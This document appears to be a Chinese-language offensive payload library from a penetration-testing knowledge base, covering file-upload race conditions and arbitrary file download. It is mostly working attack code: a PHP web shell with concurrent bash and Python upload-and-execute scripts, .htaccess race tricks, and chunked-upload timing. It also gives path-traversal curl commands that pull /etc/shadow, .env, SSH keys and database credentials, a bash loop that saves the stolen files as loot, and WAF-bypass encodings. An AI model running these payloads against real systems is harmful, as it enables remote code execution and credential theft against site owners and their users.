# 竞态 / 任意下载 payload 库

> 父文档:[00-index.md](00-index.md)
> 涵盖:文件上传条件竞争("校验-移动"窗口 / "扫描-删除"窗口) + 任意文件下载(下载接口路径可控)。

---

## A. 条件竞争

### 条件竞争  `file-competition`
利用文件上传/处理过程中的竞态条件(Race Condition)，在安全检查与文件使用之间的时间窗口内执行恶意操作
子类：**Race Condition** · tags: `race-condition` `file-upload`

**前置条件：** 目标存在文件上传功能；服务端先上传后检查的处理流程；可以高并发访问上传的文件；了解临时文件存储路径

**攻击链：**

**1. 识别竞态条件窗口**  _[linux]_
_分析文件上传的处理流程，识别安全检查前后的时间窗口_
```
# 分析上传流程:
# 1. 文件上传到临时目录
# 2. 后端进行安全检查(文件类型/内容)
# 3. 如果检查通过则保留，否则删除
# 在步骤1和步骤3之间存在时间窗口

# 测试上传响应时间(判断是否有检查延迟)
for i in $(seq 1 5); do
  time curl -s -o /dev/null -w "%{http_code}" -F "file=@test.jpg" "http://target.com/upload"
done
```

**2. 竞态条件利用 - 上传与访问并发**  _[linux]_
_在上传后安全检查删除之前的时间窗口内访问执行恶意文件_
```
# 恶意PHP文件 (shell.php):
# <?php system($_GET["cmd"]); ?>

# 方法1: 使用两个终端并发操作
# 终端1 - 持续上传:
while true; do
  curl -s -F "file=@shell.php" "http://target.com/upload" &
done

# 终端2 - 持续访问:
while true; do
  result=$(curl -s "http://target.com/uploads/shell.php?cmd=id")
  if echo "$result" | grep -q "uid="; then
    echo "[+] RCE SUCCESS: $result"
    break
  fi
done
```

**3. Python并发竞态利用脚本**
_多线程并发上传与访问，提高竞态条件利用成功率_
```
import requests
import threading
import time

TARGET = "http://target.com"
UPLOAD_URL = f"{TARGET}/upload"
SHELL_URL = f"{TARGET}/uploads/shell.php?cmd=id"

def upload_loop():
    files = {"file": ("shell.php", "<?php system($_GET['cmd']); ?>", "image/jpeg")}
    while not stop_event.is_set():
        try:
            requests.post(UPLOAD_URL, files=files, timeout=2)
        except: pass

def access_loop():
    while not stop_event.is_set():
        try:
            r = requests.get(SHELL_URL, timeout=1)
            if "uid=" in r.text:
                print(f"[+] RCE! Response: {r.text[:200]}")
                stop_event.set()
                return
        except: pass

stop_event = threading.Event()
threads = []
for _ in range(10):
    threads.append(threading.Thread(target=upload_loop))
for _ in range(20):
    threads.append(threading.Thread(target=access_loop))
for t in threads: t.start()
time.sleep(60)
stop_event.set()
for t in threads: t.join()
```

**4. .htaccess竞态写入**  _[linux]_
_利用.htaccess的竞态上传使Apache将图片文件按PHP解析执行_
```
# 如果可以上传.htaccess文件(即使会被删除):
# .htaccess内容:
AddType application/x-httpd-php .jpg

# 竞态利用:
# 1. 先正常上传一个含PHP代码的.jpg文件
curl -F "file=@shell.jpg" "http://target.com/upload"

# 2. 在.htaccess存在的时间窗口内访问.jpg
while true; do
  curl -s -F "file=@.htaccess" "http://target.com/upload" &
  result=$(curl -s "http://target.com/uploads/shell.jpg?cmd=id")
  [ -n "$result" ] && echo "[+] $result" && break
done
```

**WAF/EDR 绕过变体：**

**1. 并发上传竞态利用**
_通过大量并发请求在文件检查与删除之间的时间窗口访问已上传的文件_
```
# Python并发竞态上传
import threading, requests

def upload_shell():
    files = {'file': ('test.php', '<?php echo "security_check"; ?>', 'image/jpeg')}
    requests.post('http://target/upload', files=files)

def access_shell():
    r = requests.get('http://target/uploads/test.php')
    if 'security_check' in r.text:
        print('[+] Race won!')

for i in range(100):
    t1 = threading.Thread(target=upload_shell)
    t2 = threading.Thread(target=access_shell)
    t1.start(); t2.start()
```

**2. .htaccess竞态覆盖**
_利用竞态条件在检查间隙写入.htaccess使图片文件被解析为PHP_
```
# 竞态条件上传.htaccess
import threading, requests

def upload_htaccess():
    files = {'file': ('.htaccess', 'AddType application/x-httpd-php .jpg', 'text/plain')}
    requests.post('http://target/upload', files=files)

def upload_payload():
    files = {'file': ('test.jpg', '<?php echo "security_check"; ?>', 'image/jpeg')}
    requests.post('http://target/upload', files=files)

for i in range(50):
    t1 = threading.Thread(target=upload_htaccess)
    t2 = threading.Thread(target=upload_payload)
    t1.start(); t2.start()
```

**3. 分块上传时间窗口**
_通过分块传输编码（chunked）延长服务器处理时间，增大竞态利用窗口_
```
# 利用分块传输延长上传时间窗口
import socket, time

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(('target', 80))

headers = (
    "POST /upload HTTP/1.1\r\n"
    "Host: target\r\n"
    "Transfer-Encoding: chunked\r\n"
    "Content-Type: multipart/form-data; boundary=abc\r\n\r\n"
)
sock.send(headers.encode())

# 缓慢发送分块数据，延长文件存在时间
chunks = ["5\r\nhello\r\n", "5\r\nworld\r\n", "0\r\n\r\n"]
for chunk in chunks:
    sock.send(chunk.encode())
    time.sleep(0.5)
```

---


---

## B. 任意文件下载

### 任意文件下载  `file-download`
利用文件下载功能中的路径控制缺陷下载服务器上的任意敏感文件
子类：**下载** · tags: `file-download` `lfi` `leak`

**前置条件：** 目标存在文件下载功能；文件路径参数可控；服务端未对路径进行严格过滤

**攻击链：**

**1. 识别文件下载接口**
_识别目标的文件下载接口和参数名_
```
# 常见文件下载URL模式:
curl -v "http://target.com/download?file=report.pdf"
curl -v "http://target.com/download.php?path=uploads/doc.pdf"
curl -v "http://target.com/api/file/read?name=image.jpg"
curl -v "http://target.com/export?filename=data.csv"
curl -v "http://target.com/attachment/get/123"
```

**2. 路径遍历下载敏感文件**
_利用路径遍历序列读取Web根目录以外的敏感系统和应用配置文件_
```
# Linux敏感文件:
curl "http://target.com/download?file=../../../etc/passwd"
curl "http://target.com/download?file=....//....//....//etc/shadow"
curl "http://target.com/download?file=%2e%2e/%2e%2e/%2e%2e/etc/passwd"
curl "http://target.com/download?file=..%252f..%252f..%252fetc/passwd"

# Windows敏感文件:
curl "http://target.com/download?file=......windowswin.ini"
curl "http://target.com/download?file=......windowssystem32configSAM"

# Web应用配置文件:
curl "http://target.com/download?file=../WEB-INF/web.xml"
curl "http://target.com/download?file=../application.properties"
curl "http://target.com/download?file=../.env"
curl "http://target.com/download?file=../config/database.yml"
```

**3. 下载源码与数据库配置**  _[linux]_
_针对性下载应用源码和数据库配置文件获取数据库凭证_
```
# Java应用关键文件:
curl "http://target.com/download?file=../../WEB-INF/web.xml" -o web.xml
curl "http://target.com/download?file=../../WEB-INF/classes/application.yml" -o app.yml
curl "http://target.com/download?file=../../WEB-INF/classes/db.properties" -o db.properties

# PHP应用:
curl "http://target.com/download?file=../../config.php" -o config.php
curl "http://target.com/download?file=../../.env" -o .env

# Node.js应用:
curl "http://target.com/download?file=../../package.json" -o package.json
curl "http://target.com/download?file=../../.env" -o .env

# 提取数据库凭证:
grep -iE "password|passwd|pwd|secret|key|db_|database|mysql|postgres" *.yml *.xml *.properties *.env 2>/dev/null
```

**4. 自动化批量敏感文件探测**  _[linux]_
_自动化探测和下载多个常见敏感文件_
```
#!/bin/bash
# 批量测试常见敏感文件路径
BASE="http://target.com/download?file="
FILES=(
  "../../../etc/passwd" "../../../etc/shadow" "../../../etc/hosts"
  "../../../proc/self/environ" "../../../proc/self/cmdline"
  "../../WEB-INF/web.xml" "../../WEB-INF/classes/application.properties"
  "../../.env" "../../config.php" "../../web.config"
  "../../../root/.ssh/id_rsa" "../../../root/.bash_history"
  "../../../var/log/apache2/access.log"
)

for f in "${FILES[@]}"; do
  resp=$(curl -s -o /dev/null -w "%{http_code}:%{size_download}" "${BASE}${f}")
  code=$(echo $resp | cut -d: -f1)
  size=$(echo $resp | cut -d: -f2)
  if [ "$code" == "200" ] && [ "$size" -gt 0 ]; then
    echo "[+] FOUND: $f (HTTP $code, $size bytes)"
    curl -s "${BASE}${f}" -o "loot_$(echo $f | tr '/' '_')"
  fi
done
```

**WAF/EDR 绕过变体：**

**1. 双重URL编码绕过**
_利用双重URL编码、Unicode超长编码等绕过WAF对路径遍历字符的检测_
```
# 双重编码../
?file=%252e%252e%252f%252e%252e%252fetc%252fpasswd
?file=%252e%252e%255cetc%255cpasswd

# Unicode编码变体
?file=..%c0%af..%c0%afetc/passwd
?file=..%ef%bc%8f..%ef%bc%8fetc/passwd

# 混合编码
?file=..%2f..%2f..%2fetc%2fpasswd
?file=....//....//etc/passwd
```

**2. 参数名替换与路径操控**
_尝试不同的文件参数名和URL协议wrapper绕过WAF规则_
```
# 常见文件下载参数名Fuzz
?path=../../etc/passwd
?filepath=../../etc/passwd
?filename=../../etc/passwd
?doc=../../etc/passwd
?download=../../etc/passwd
?src=../../etc/passwd
?url=file:///etc/passwd

# 利用URL协议
?file=file:///etc/passwd
?file=php://filter/convert.base64-encode/resource=config.php
```

**3. 空字节截断与后缀绕过**
_利用空字节截断、路径长度限制和特殊字符混淆绕过文件路径检查_
```
# 空字节截断（PHP < 5.3.4）
?file=../../etc/passwd%00
?file=../../etc/passwd%00.jpg

# 路径截断（Windows长路径）
?file=../../etc/passwd..............................................................

# 点斜杠混淆
?file=....//....//....//etc/passwd
?file=..;/..;/..;/etc/passwd
?file=..\..\..\etc\passwd
```

---


---

← 回 [00-index.md](00-index.md) · 相关:[`../race-conditions.md`](../race-conditions.md)
